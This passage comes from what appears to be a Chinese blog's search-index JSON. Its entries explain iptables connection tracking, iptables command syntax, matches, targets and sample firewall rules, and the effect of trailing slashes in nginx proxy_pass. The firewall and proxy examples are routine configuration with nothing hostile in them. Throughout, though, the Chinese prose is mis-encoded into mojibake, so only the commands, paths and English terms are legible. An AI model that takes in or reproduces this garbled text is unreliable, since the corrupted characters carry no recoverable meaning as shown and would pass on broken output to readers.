çš„é¦–å­—æ¯ç¼©å†™ï¼‰ã€‚conntrackå¯ä»¥ä½œä¸ºæ¨¡å—å®‰è£…ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†ã€‚conntrackä¸­æœ‰è®¸å¤šç”¨æ¥å¤„ç†TCPã€UDPæˆ–ICMPåè®®çš„éƒ¨ä»¶ã€‚è¿™äº›æ¨¡å—ä»æ•°æ®åŒ…ä¸­æå–è¯¦ç»†çš„ã€å”¯ä¸€çš„ä¿¡æ¯ï¼Œå› æ­¤èƒ½ä¿æŒå¯¹æ¯ä¸€ä¸ªæ•°æ®æµçš„è·Ÿè¸ªã€‚è¿™äº›ä¿¡æ¯ä¹Ÿå‘ŠçŸ¥conntrackæµå½“å‰çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼ŒUDPæµä¸€èˆ¬ç”±ä»–ä»¬çš„ç›®çš„åœ°å€ã€æºåœ°å€ã€ç›®çš„ç«¯å£å’Œæº ç«¯å£å”¯ä¸€ç¡®å®šã€‚ é™¤äº†æœ¬åœ°äº§ç”Ÿçš„åŒ…ç”±OUTPUTé“¾å¤„ç†å¤–ï¼Œæ‰€æœ‰è¿æ¥è·Ÿè¸ªéƒ½æ˜¯åœ¨PREROUTINGé“¾é‡Œè¿›è¡Œå¤„ç†çš„ï¼Œæ„æ€å°±æ˜¯ï¼Œ iptablesä¼šåœ¨PREROUTINGé“¾é‡Œä»æ–°è®¡ç®—æ‰€æœ‰çš„çŠ¶æ€ã€‚å¦‚æœæˆ‘ä»¬å‘é€ä¸€ä¸ªæµçš„åˆå§‹åŒ–åŒ…ï¼ŒçŠ¶æ€å°±ä¼šåœ¨OUTPUTé“¾é‡Œè¢«è®¾ç½®ä¸ºNEWï¼Œå½“æˆ‘ä»¬æ”¶åˆ°å›åº”çš„åŒ…æ—¶ï¼ŒçŠ¶æ€å°±ä¼šåœ¨PREROUTINGé“¾é‡Œè¢«è®¾ç½®ä¸ºESTABLISHEDã€‚å¦‚æœç¬¬ä¸€ä¸ªåŒ…ä¸æ˜¯æœ¬åœ°äº§ç”Ÿçš„ï¼Œé‚£å°±ä¼šåœ¨PREROUTINGé“¾é‡Œè¢«è®¾ç½®ä¸ºNEWçŠ¶æ€ã€‚ç»¼ä¸Šï¼Œæ‰€æœ‰çŠ¶æ€çš„æ”¹å˜å’Œè®¡ç®—éƒ½æ˜¯åœ¨natè¡¨ä¸­çš„PREROUTINGé“¾å’ŒOUTPUTé“¾é‡Œå®Œæˆçš„ã€‚ ","date":"2021-04-23 15:54","objectID":"/post/2337/:0:1","tags":["iptables"],"title":"iptablesçŠ¶æ€æœºåˆ¶(è¿æ¥è·Ÿè¸ªæœºåˆ¶)","uri":"/post/2337/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€conntrackè®°å½• æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ€æ ·é˜…è¯»/proc/net/ip_conntracké‡Œçš„conntrackè®°å½•ã€‚è¿™äº›è®°å½•è¡¨ç¤ºçš„æ˜¯å½“å‰è¢«è·Ÿè¸ªçš„è¿æ¥ã€‚å¦‚æœå®‰è£…äº†ip_conntrackæ¨¡å—ï¼Œcat /proc/net/ip_conntrackçš„æ˜¾ç¤ºç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š(æ–°ç‰ˆæœ¬å«nf_conntrack) ipv4 2 tcp 6 299 ESTABLISHED src=192.168.10.252 dst=192.168.10.150 sport=59148 dport=22 src=192.168.10.150 dst=192.168.10.252 sport=22 dport=59148 [ASSURED] mark=0 secctx=system_u:object_r:unlabeled_t:s0 zone=0 use=2 ipv4 2 udp 17 9 src=0.0.0.0 dst=255.255.255.255 sport=68 dport=67 [UNREPLIED] src=255.255.255.255 dst=0.0.0.0 sport=67 dport=68 mark=0 secctx=system_u:object_r:unlabeled_t:s0 zone=0 use=2 conntrackæ¨¡å—ç»´æŠ¤çš„æ‰€æœ‰ä¿¡æ¯éƒ½åŒ…å«åœ¨è¿™ä¸ªä¾‹å­ä¸­äº†ï¼Œé€šè¿‡å®ƒä»¬å°±å¯ä»¥çŸ¥é“æŸä¸ªç‰¹å®šçš„è¿æ¥å¤„äºä»€ä¹ˆçŠ¶æ€ã€‚ ç¬¬ä¸€åˆ—: ç½‘ç»œå±‚åè®®åç§° ç¬¬äºŒåˆ—: å¯èƒ½æ˜¯ç½‘ç»œå±‚çš„åè®®ç±»å‹ä»£ç  ç¬¬ä¸‰åˆ—: ä¼ è¾“å±‚åè®®åç§° ç¬¬å››åˆ—: ä¼ è¾“å±‚åè®®ç±»å‹ä»£ç (å¯åœ¨/etc/protocolsä¸­æŸ¥çœ‹) ç¬¬äº”åˆ—: è¿™æ¡conntrackè®°å½•çš„ç”Ÿå­˜æ—¶é—´ç§’ï¼Œè¿™ä¸ªå€¼ä¼šæ¯ç§’é€’å‡ï¼Œæœ‰æ–°çš„æµé‡è¿›æ¥åï¼Œè¿™ä¸ªå€¼ä¼šé‡ç½®å›é»˜è®¤å€¼ã€‚æ¯”å¦‚tcpçš„é»˜è®¤æ˜¯432000ï¼Œudpæ˜¯30ï¼Œæ¯å½“è¿›è¡Œé€šä¿¡æˆ–äº¤æ¢æ•°æ®æ—¶éƒ½ä¼šé‡ç½®æ­¤å€¼ã€‚(/proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established)or(sysctl -a |grep net.netfilter.nf_conntrack_tcp_) ESTABLISHED: tcpçŠ¶æ€ä¿¡æ¯ï¼Œudpæ²¡æœ‰è¿™ä¸€åˆ—ã€‚ åé¢çš„æ˜¯è¯·æ±‚åœ°å€å’Œç«¯å£ï¼Œæœ‰ä¸¤å¯¹ã€‚ç¬¬ä¸€å¯¹ä»£è¡¨è¯·æ±‚ç«¯ï¼Œç¬¬äºŒå¯¹ä»£è¡¨å“åº”ç«¯ [ASSURED]: è¯´æ˜ä¸¤ä¸ªæ–¹å‘éƒ½æœ‰æµé‡ï¼Œåœ¨è¿æ¥è·Ÿè¸ªè¡¨æ»¡æ—¶ï¼Œæ²¡æœ‰[ASSURED]çš„è®°å½•å°±è¦è¢«åˆ é™¤ã€‚ [UNREPLIED]: è¯´æ˜è¿™ä¸ªè¿æ¥è¿˜æ²¡æœ‰æ”¶åˆ°ä»»ä½•å“åº” è·Ÿè¸ªæ¡ç›®æ˜¯å­˜åœ¨å†…å­˜ä¸­çš„ï¼Œé»˜è®¤æœ€å¤§å¯ä¿å­˜65536æ¡è®°å½•(/proc/sys/net/netfilter/nf_conntrack_max),è¶…è¿‡åä¼šå‘ç”Ÿä¸¢åŒ…ï¼Œ/var/log/messagesæŠ¥é”™kernel: nf_conntrack: table full, dropping packet ###ä¸‰ã€ æ•°æ®åŒ…åœ¨ç”¨æˆ·ç©ºé—´çš„çŠ¶æ€ iptablesä¸­çš„å››ç§è¿æ¥çŠ¶æ€ NEW NEWä»£è¡¨æ–°è¿æ¥çš„ç¬¬ä¸€ä¸ªåŒ…ã€‚ ESTABLISHED åªè¦æˆ‘ä»¬å‘é€å¹¶æ¥åˆ°å¯¹ç«¯çš„åº”ç­”ï¼Œè¿æ¥å°±æ˜¯ESTABLISHEDçŠ¶æ€äº†ã€‚ RELATED ä¸€ä¸ªè¿æ¥è¦æƒ³ æ˜¯RELATEDçš„ï¼Œé¦–å…ˆè¦æœ‰ä¸€ä¸ªESTABLISHEDçš„è¿æ¥ã€‚è¿™ä¸ªESTABLISHEDè¿æ¥å†äº§ç”Ÿä¸€ä¸ªä¸»è¿æ¥ä¹‹å¤–çš„è¿æ¥ï¼Œè¿™ä¸ªæ–°çš„è¿æ¥å°±æ˜¯RELATEDçš„äº†ï¼Œå½“ç„¶å‰ææ˜¯conntrackæ¨¡å—è¦èƒ½ç†è§£RELATEDã€‚ftpæ˜¯ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼ŒFTP-dataè¿æ¥ å’Œ FTP-controlè¿æ¥ æœ‰ RELATEDçš„å…³ç³»ã€‚è¿˜æœ‰å…¶ä»–çš„ä¾‹å­ï¼Œæ¯”å¦‚ï¼Œé€šè¿‡IRCçš„DCCè¿æ¥ã€‚æœ‰äº†è¿™ä¸ªçŠ¶æ€ï¼ŒICMPåº”ç­”ã€FTPä¼ è¾“ã€DCCç­‰æ‰èƒ½ç©¿è¿‡é˜²ç«å¢™æ­£å¸¸å·¥ä½œã€‚æ³¨æ„ï¼Œå¤§éƒ¨åˆ†è¿˜æœ‰ä¸€äº›UDPåè®®éƒ½ä¾èµ–è¿™ä¸ªæœºåˆ¶ã€‚è¿™äº›åè®® æ˜¯å¾ˆå¤æ‚çš„ï¼Œå®ƒä»¬æŠŠè¿æ¥ä¿¡æ¯æ”¾åœ¨æ•°æ®åŒ…é‡Œï¼Œå¹¶ä¸”è¦æ±‚è¿™äº›ä¿¡æ¯èƒ½è¢«æ­£ç¡®ç†è§£ã€‚ INVALID INVALIDè¯´æ˜æ•°æ®åŒ…ä¸èƒ½è¢«è¯†åˆ«å±äºå“ªä¸ªè¿æ¥æˆ–æ²¡æœ‰ä»»ä½•çŠ¶æ€ã€‚æœ‰å‡ ä¸ªåŸå› å¯ä»¥äº§ç”Ÿè¿™ç§æƒ…å†µï¼Œæ¯”å¦‚ï¼Œå†…å­˜æº¢å‡ºï¼Œæ”¶åˆ°ä¸çŸ¥å±äºå“ªä¸ªè¿æ¥çš„ICMP é”™è¯¯ä¿¡æ¯ã€‚ä¸€èˆ¬åœ°ï¼Œæˆ‘ä»¬DROPè¿™ä¸ªçŠ¶æ€çš„ä»»ä½•ä¸œè¥¿ã€‚ ","date":"2021-04-23 15:54","objectID":"/post/2337/:0:2","tags":["iptables"],"title":"iptablesçŠ¶æ€æœºåˆ¶(è¿æ¥è·Ÿè¸ªæœºåˆ¶)","uri":"/post/2337/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"iptables manæ‰‹å†Œ: https://linux.die.net/man/8/iptables iptablesä¸­æ–‡æ–‡æ¡£: https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html å¤‡ç”¨é“¾æ¥: https://soulchild.cn/iptables ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:0","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€iptableså‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ æ ¼å¼: iptables [-t table] command [match] [target] -t table: æŒ‡å®šè¡¨åï¼Œä¸æŒ‡å®šé»˜è®¤æ˜¯filterè¡¨ COMMAND: å‘Šè¯‰iptablesæˆ‘ä»¬è¦åšä»€ä¹ˆï¼Œæ¯”å¦‚æ·»åŠ è§„åˆ™ã€åˆ é™¤è§„åˆ™ã€æ›¿æ¢è§„åˆ™ã€ä¿®æ”¹è§„åˆ™ã€æ’å…¥è§„åˆ™ç­‰ç­‰ match: è¦å¯¹å“ªäº›æ•°æ®åŒ…åšæ“ä½œï¼Œå¯ä»¥æŒ‡å®šåŒ…çš„æ¥æºIPåœ°å€ï¼Œç½‘ç»œæ¥å£ï¼Œç«¯å£ï¼Œåè®®ç±»å‹ç­‰ç­‰æ¥é€‰æ‹©æ•°æ®åŒ… target: æŒ‡å®šè¦æ‰§è¡Œçš„æ“ä½œ,æ¯”å¦‚DROPã€ACCEPTã€SNTã€DNATã€‚(å¯åœ¨ä¸­æ–‡æ–‡æ¡£6.5éƒ¨åˆ†æŸ¥é˜…) ä¸‹å›¾å¼•è‡ª: https://www.cnblogs.com/kevingrace/p/6265113.html 50965-s09k6z8ubo.png ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:1","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€iptablesçš„COMMANDï¼ˆhttps://soulchild.cn/iptables/#COMMANDSï¼‰ -A chain: åœ¨æŒ‡å®šçš„é“¾ä¸­è¿½åŠ è§„åˆ™(å°¾éƒ¨) -I chain [rulenum]: åœ¨æŒ‡å®šçš„é“¾ä¸­æ’å…¥è§„åˆ™(é»˜è®¤åœ¨é¦–éƒ¨ï¼Œå¯ä»¥æŒ‡å®šè§„åˆ™ç¼–å·) -D chain [rulenum]: åˆ é™¤æŒ‡å®šé“¾ä¸­çš„è§„åˆ™(é»˜è®¤åˆ é™¤æœ€åä¸€ä¸ª) -R chain [rulenum]: æ›¿æ¢æŒ‡å®šé“¾ä¸­çš„è§„åˆ™ -F: æ¸…é™¤æŒ‡å®šçš„é“¾ä¸­çš„è§„åˆ™(å¦‚æœæœªæŒ‡å®šé“¾,åˆ™æ¸…é™¤è¡¨ä¸­çš„æ‰€æœ‰é“¾çš„è§„åˆ™) -N: è‡ªå®šä¹‰æ–°é“¾ -X: åˆ é™¤è‡ªå®šä¹‰é“¾(å¿…é¡»æ˜¯ç©ºé“¾) -L: åˆ—å‡ºæ‰€é€‰é“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ -nä»¥æ•°å­—æ˜¾ç¤ºç«¯å£ä¿¡æ¯ -v|-vvæ˜¾ç¤ºè§„åˆ™çš„è¯¦ç»†ä¿¡æ¯(åŒ…æ‹¬æ¯ä¸ªè§„åˆ™åŒ¹é…åˆ°çš„æ•°æ®åŒ…æ•°é‡) â€“line æ˜¾ç¤ºè§„åˆ™ç¼–å· Z: å°†æŒ‡å®šè¡¨ä¸­çš„æ‰€æœ‰é“¾çš„å­—èŠ‚å’Œæ•°æ®åŒ…è®¡æ•°å™¨æ¸…é›¶ -P: ä¿®æ”¹æŒ‡å®šé“¾ä¸­çš„é»˜è®¤è§„åˆ™ï¼Œæ‰€æœ‰è§„åˆ™ä¸èƒ½åŒ¹é…çš„æ—¶å€™ä¼šä½¿ç”¨é»˜è®¤è§„åˆ™ ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:2","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸‰ã€matches(åŒ¹é…æ¡ä»¶https://soulchild.cn/iptables/#MATCHES) ä»‹ç»ä¸€äº›å¸¸ç”¨çš„ -p, --protocol: åŒ¹é…åè®®ï¼Œä¸åŒåè®®æœ‰ä¸åŒçš„åŒ¹é…å‚æ•°.ä¸æŒ‡å®šåè®®é»˜è®¤ä¸ºæ‰€æœ‰åè®® tcpå’Œudpåè®® --tcp-flags: æ­¤é€‰é¡¹æ˜¯tcpåè®®çš„ã€‚ è¯¥é€‰é¡¹æœ‰ä¸¤ä¸ªåˆ—è¡¨ç±»å‹çš„å‚æ•°ã€‚ ç¬¬ä¸€ä¸ªåˆ—è¡¨æŒ‡å®šæˆ‘ä»¬è¦æ£€æŸ¥çš„æ ‡å¿—ä½ã€‚ ç¬¬äºŒä¸ªåˆ—è¡¨æŒ‡å®š åœ¨ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­å‡ºç°è¿‡çš„ä¸”å¿…é¡»è¢«è®¾ä¸º1çš„æ ‡å¿—ä½,ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­å…¶ä»–çš„æ ‡å¿—ä½å¿…é¡»ç½®0 æ¯”å¦‚: -p tcp --tcp-flags SYN,ACK,FIN SYN,ACK,è¿™é‡ŒåŒ¹é…çš„æ˜¯SYNå’ŒACKä¸º1ï¼ŒFINä¸º0çš„æ•°æ®åŒ… -m multiport: è®©ä¸‹é¢çš„é€‰é¡¹æ”¯æŒåŒ¹é…å¤šä¸ªç«¯å£ï¼Œå†™æ³•22,53,80,110ã€‚å¹¶ä¸”æ”¯æŒ--portså‚æ•°ï¼Œ--portsä»£è¡¨äº†æºå’Œç›®çš„ç«¯å£ --sport, --source-port: æºç«¯å£ --dport, --destination-port: tcpåŒ…çš„ç›®çš„ç«¯å£ -s, --src, --source: åŒ¹é…æºåœ°å€ -d, --dst, --destination: åŒ¹é…ç›®æ ‡åœ°å€ -i, --in-interface: åŒ¹é…ä»ç½‘ç»œæ¥å£è¿›æ¥çš„æ•°æ®åŒ…ï¼Œåªèƒ½ç”¨äºINPUTï¼ŒFORWARDå’Œ PREROUTINGè¿™ä¸‰ä¸ªé“¾ -o, --out-interface: åŒ¹é…ä»ç½‘ç»œæ¥å£å‡ºå»çš„æ•°æ®åŒ… -f, --fragment: ç”¨æ¥åŒ¹é…ä¸€ä¸ªè¢«åˆ†ç‰‡çš„åŒ…çš„ç¬¬äºŒç‰‡æˆ–åŠä»¥åçš„éƒ¨åˆ†ã€‚ -m --state: æŒ‡å®šè¦åŒ¹é…åŒ…çš„çš„çŠ¶æ€ï¼Œæœ‰4ç§çŠ¶æ€å¯ç”¨ï¼šINVALIDï¼ŒESTABLISHEDï¼ŒNEWå’ŒRELATEDã€‚ INVALID: æ„å‘³ç€è¿™ä¸ªåŒ…æ²¡æœ‰å·²çŸ¥çš„æµæˆ–è¿æ¥ä¸ä¹‹å…³è”ï¼Œä¹Ÿå¯èƒ½æ˜¯å®ƒåŒ…å«çš„æ•°æ®æˆ–åŒ…å¤´æœ‰é—®é¢˜ã€‚ ESTABLISHED: æ„æ€æ˜¯åŒ…æ˜¯å®Œå…¨æœ‰æ•ˆçš„ï¼Œè€Œä¸”å±äºä¸€ä¸ªå·²å»ºç«‹çš„è¿æ¥ï¼Œè¿™ä¸ªè¿æ¥çš„ä¸¤ç«¯éƒ½å·²ç»æœ‰æ•°æ®å‘é€ã€‚ NEW: è¡¨ç¤ºåŒ…å°†è¦æˆ–å·²ç»å¼€å§‹å»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥ RELATED: è¯´æ˜åŒ…æ­£åœ¨å»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥ï¼Œè¿™ä¸ªè¿æ¥æ˜¯å’Œä¸€ä¸ªå·²å»ºç«‹çš„è¿æ¥ç›¸å…³çš„ã€‚æ¯”å¦‚FTP-dataå’ŒFTP-controlå°±æ˜¯RELATEDå…³ç³» ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:3","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å››ã€target( æ‰§è¡Œçš„åŠ¨ä½œhttps://soulchild.cn/iptables/#TARGETS ) targetå†³å®šç¬¦åˆæ¡ä»¶çš„åŒ…åˆ°ä½•å¤„å»ï¼Œè¯­æ³•æ˜¯--jump targetæˆ–-j targetã€‚ æˆ‘ä»¬åœ¨filterè¡¨ä¸­å»ºä¸€ä¸ªåä¸ºtcp_packetsçš„é“¾ï¼šiptables -N tcp_packets ç„¶åå†æŠŠå®ƒä½œä¸ºjumpçš„targetï¼šiptables -A INPUT -p tcp -j tcp_packets è¿™æ ·æˆ‘ä»¬å°±ä¼šä»INPUTé“¾è·³å…¥tcp_packetsé“¾ï¼Œå¼€å§‹åœ¨tcp_packetsä¸­çš„æ—…è¡Œã€‚å¦‚æœåˆ°è¾¾äº†tcp_packetsé“¾å,æœªè¢«é“¾ä¸­çš„ä»»ä½•è§„åˆ™åŒ¹é…ï¼Œåˆ™ä¼šé€€åˆ°INPUTé“¾çš„ä¸‹ä¸€æ¡è§„åˆ™ç»§ç»­å®ƒçš„æ—…è¡Œã€‚å¦‚æœåœ¨å­é“¾(tcp_packets)ä¸­è¢«ACCEPTäº†ï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨çˆ¶é“¾ä¸­è¢«ACCEPTäº†ï¼Œé‚£ä¹ˆå®ƒä¸ä¼šå†ç»è¿‡çˆ¶é“¾ä¸­çš„å…¶ä»–è§„åˆ™ã€‚ä½†è¦æ³¨æ„è¿™ä¸ªåŒ…èƒ½è¢«å…¶ä»–è¡¨çš„é“¾åŒ¹é…ï¼Œè¿‡ç¨‹å¯ä»¥å‚è€ƒè¡¨çš„ä¼˜å…ˆçº§ã€‚ targetæŒ‡å®šæˆ‘ä»¬è¦å¯¹åŒ…åšçš„æ“ä½œï¼Œæ¯”å¦‚DROPå’ŒACCEPTç­‰ç­‰ï¼Œä¸‹é¢ä»‹ç»ä¸€äº›å¸¸ç”¨çš„ã€‚ -j ACCEPT: æ”¾è¡Œ -j DROP: ä¸¢å¼ƒ -j REJECT: ä¸DROPçš„åŒºåˆ«æ˜¯ï¼ŒREJECTå°±å‘å®¢æˆ·ç«¯å“åº”ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡--reject-withé€‰é¡¹æ¥æ§åˆ¶(é»˜è®¤port-unreachable),å¯ç”¨é€‰é¡¹å¦‚ä¸‹ icmp-net-unreachable: ç½‘ç»œä¸å¯è¾¾ icmp-host-unreachable: ä¸»æœºä¸å¯è¾¾ icmp-port-unreachable: ç«¯å£ä¸å¯è¾¾ icmp-proto-unreachable: åè®®ä¸å¯è¾¾ icmp-net-prohibited: ç›®çš„ç½‘ç»œè¢«å¼ºåˆ¶ç¦æ­¢ icmp-host-prohibited: ç›®çš„ä¸»æœºè¢«å¼ºåˆ¶ç¦æ­¢ -j LOG: LOGåªä¼šè®°å½•åŒ…çš„ç›¸å…³ä¿¡æ¯.å¯ä»¥åœ¨/var/log/messagesä¸­æŸ¥çœ‹ã€‚(è¯¦ç»†ä»‹ç»https://soulchild.cn/iptables/#LOGTARGET) -j ULOG: æ”¯æŒå°†LOGå†™åˆ°æ•°æ®åº“ä¸­ -j DNAT: ç›®çš„ç½‘ç»œåœ°å€è½¬æ¢ã€‚é€šå¸¸ç”¨äºå¤–éƒ¨è®¿é—®å†…éƒ¨ã€‚ ä¾‹å¦‚: iptables -t nat -A PREROUTING -d 15.45.23.67 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1-192.168.1.10ã€‚ éœ€è¦æ³¨æ„ï¼šæ•°æ®åŒ…å‘å‘å†…éƒ¨ä¸»æœºåï¼Œä¼šå‘æºåœ°å€å“åº”ï¼Œä½†æ˜¯å®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯iptablesä¸»æœºï¼Œè¿™æ ·çš„è¯tcpæ— æ³•æ¡æ‰‹æˆåŠŸã€‚éœ€è¦å°†å†…éƒ¨ä¸»æœºçš„ç½‘å…³æŒ‡å‘iptablesä¸»æœºã€‚æˆ–è€…åœ¨åŠ ä¸€æ¡SNATè§„åˆ™å°†æºåœ°å€æ”¹ä¸ºæœ¬åœ°IP(iptables -t nat -A POSTROUTING -p tcp --dport 80 -j SNAT --to-source 192.168.1.150) -j SNAT: æºç½‘ç»œåœ°å€è½¬æ¢ã€‚é€šå¸¸ç”¨äºå†…éƒ¨è®¿é—®å¤–éƒ¨ ä¾‹å¦‚: iptables -t nat -A POSTROUTING -p tcp --dport 80 -j SNAT --to-source 192.168.10.150 -j MASQUERADE: å’ŒSNATçš„ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«å°±æ˜¯å®ƒä¸éœ€è¦æŒ‡å®šâ€“to-sourceã€‚è€Œæ˜¯è‡ªåŠ¨è·å–ç½‘å¡çš„IPåœ°å€,å¦‚æœæ¡ä»¶å…è®¸å»ºè®®ä½¿ç”¨SNAT -j REDIRECT: å°†æ•°æ®åŒ…çš„ç«¯å£é‡å®šå‘åˆ°æœ¬æœºå¦ä¸€ä¸ªç«¯å£(é€‚ç”¨äºæœ¬åœ°ç«¯å£çš„è½¬å‘(æ•ˆç‡é«˜),DNATé€‚åˆå¤–éƒ¨ä¸»æœºçš„è½¬å‘)ã€‚ ä¾‹å¦‚: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080 -j RETURN: å®ƒä½¿åŒ…è¿”å›ä¸Šä¸€å±‚ï¼Œé¡ºåºæ˜¯ï¼šå­é“¾â€”â€”\u003eçˆ¶é“¾â€”â€”\u003eé»˜è®¤ç­–ç•¥ã€‚å…·ä½“åœ°è¯´ï¼Œå°±æ˜¯è‹¥åŒ…åœ¨å­é“¾ä¸­é‡åˆ°äº†RETURNï¼Œåˆ™è¿”å›çˆ¶é“¾çš„ä¸‹ä¸€æ¡è§„åˆ™ç»§ç»­è¿›è¡Œæ¡ä»¶çš„æ¯”è¾ƒï¼Œè‹¥æ˜¯åœ¨çˆ¶é“¾ï¼ˆæˆ–ç§°ä¸»é“¾ï¼Œæ¯”å¦‚INPUTï¼‰ä¸­é‡åˆ°äº†RETURNï¼Œå°±è¦åº”ç”¨é»˜è®¤çš„ç­–ç•¥ï¼ˆä¸€èˆ¬æ˜¯ACCEPTæˆ–DROPï¼‰ã€‚ -j NOTRACK: å¯¹æŒ‡å®šçš„åŒ…ä¸åšçŠ¶æ€è¿½è¸ª ä¾‹å¦‚: iptables -t raw -I PREROUTING -p tcp --dport 22 -j NOTRACK iptables -t raw -I OUTPUT -p tcp --dport 22 -j NOTRACK ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:4","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äº”ã€å¸¸ç”¨çš„ä¾‹å­ æ”¾è¡Œ80ç«¯å£ iptables -I INPUT -p tcp --dport 80 -j ACCEPT ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:5","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å°†filterè¡¨çš„INPUTã€OUTPUTé“¾é»˜è®¤è§„åˆ™æ”¹ä¸ºDROP iptables -P INPUT DROP iptables -P OUTPUT DROP å¼€æ”¾æœ¬åœ°å›ç¯åœ°å€ iptables -I INPUT -i lo -j ACCEPT DNSæœåŠ¡å™¨é…ç½® #å¼€æ”¾UDP 53ç«¯å£(æ¥æ”¶å¤–éƒ¨DNSæœåŠ¡å™¨å“åº” å’Œ æ¥æ”¶å…¶ä»–æœåŠ¡å™¨çš„DNSè¯·æ±‚) iptables -A INPUT -p udp -m multiport --port 53 -j ACCEPT #å¼€æ”¾TCP 53ç«¯å£(ç”¨äºåŒºåŸŸæ–‡ä»¶ä¼ è¾“ä½¿ç”¨,å¯¹äºä¸»DNSå¯ä»¥åªå¼€æ”¾dport 53) iptables -A INPUT -p tcp -m multiport --port 53 -j ACCEPT å…è®¸å†…éƒ¨pingå¤–éƒ¨ï¼Œç¦æ­¢å¤–éƒ¨pingå†…éƒ¨ ç±»å‹å‚è€ƒhttps://soulchild.cn/iptables/#TABLE.ICMPTYPES 0: icmpåº”ç­”åŒ… 8: icmpè¯·æ±‚åŒ… # å…è®¸æœ¬åœ°æ¥æ”¶icmpåº”ç­”åŒ… iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT # æ‹’ç»æœ¬åœ°æ¥æ”¶icmpè¯·æ±‚åŒ… iptables -A INPUT -p icmp --icmp-type 8 -j DROP å¦‚æœOUTPUTé“¾é»˜è®¤ç­–ç•¥æ˜¯DROPï¼Œè¿˜éœ€è¦å…è®¸æœ¬åœ°å‘é€icmpè¯·æ±‚åŒ… iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:6","tags":["iptables"],"title":"iptableså‘½ä»¤ä»‹ç»(äºŒ)","uri":"/post/2328/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"nginxåå‘ä»£ç†çš„æ—¶å€™åŠ /å’Œä¸åŠ /åŒºåˆ«å¾ˆå¤§ï¼Œæƒ…å†µä¹Ÿæœ‰å¾ˆå¤šç§ï¼Œå®¹æ˜“å¿˜è®°è®°æ··ï¼Œè¿™é‡Œè®°å½•ä¸€äº›æƒ…å†µ ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:0","tags":["nginx"],"title":"nginxåå‘ä»£ç†åŠ æ–œæ å’Œä¸åŠ æ–œæ çš„é—®é¢˜","uri":"/post/2326/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é»˜è®¤æƒ…å†µä¸‹ location / { proxy_pass http://127.0.0.1:8888; # è®¿é—®: http://localhost/test/1 ==\u003e http://127.0.0.1:8888/test/1 } ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:1","tags":["nginx"],"title":"nginxåå‘ä»£ç†åŠ æ–œæ å’Œä¸åŠ æ–œæ çš„é—®é¢˜","uri":"/post/2326/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"locationå’Œproxy_passä¸åŒåœ°æ–¹åŠ / location /test01 { proxy_pass http://127.0.0.1:8888; # localhost/test01/123 ==\u003e 127.0.0.1:8888/test01/123 } location /test02/ { # æ³¨æ„ä¸ä¼šåŒ¹é…localhost/test02 proxy_pass http://127.0.0.1:8888; # localhost/test02/123 ==\u003e 127.0.0.1:8888/test02/123 } location /test03/ { # æ³¨æ„ä¸ä¼šåŒ¹é…localhost/test03 proxy_pass http://127.0.0.1:8888/; # localhost/test03/ ==\u003e 127.0.0.1:8888/ # localhost/test03/123 ==\u003e 127.0.0.1:8888/123 } location /test04 { proxy_pass http://127.0.0.1:8888/; # localhost/test04aaa ==\u003e 127.0.0.1:8888/aaa # localhost/test04/123 ==\u003e 127.0.0.1:8888//123 } ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:2","tags":["nginx"],"title":"nginxåå‘ä»£ç†åŠ æ–œæ å’Œä¸åŠ æ–œæ çš„é—®é¢˜","uri":"/post/2326/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"proxy_passå¸¦åç¼€çš„ location /test06 { proxy_pass http://127.0.0.1:8888/uri; # localhost/test06 ==\u003e 127.0.0.1:8888/uri # localhost/test06/ ==\u003e 